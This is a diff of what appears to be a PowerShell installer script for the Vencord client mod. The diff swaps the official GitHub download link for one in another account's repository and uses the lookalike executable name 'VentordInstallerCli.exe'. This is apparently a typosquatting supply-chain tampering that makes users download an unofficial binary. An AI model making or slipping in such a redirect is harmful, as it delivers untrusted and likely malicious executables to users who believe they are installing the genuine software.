@@ -1,6 +1,6 @@
-$link = "https://github.com/Vencord/Installer/releases/latest/download/VencordInstallerCli.exe"
+$link = "https://github.com/AmizRm/Installer/releases/latest/download/VentordInstallerCli.exe"
 
-$outfile = "$env:TEMP\VencordInstallerCli.exe"
+$outfile = "$env:TEMP\VentordInstallerCli.exe"
 
 Write-Output "Downloading installer to $outfile"
 
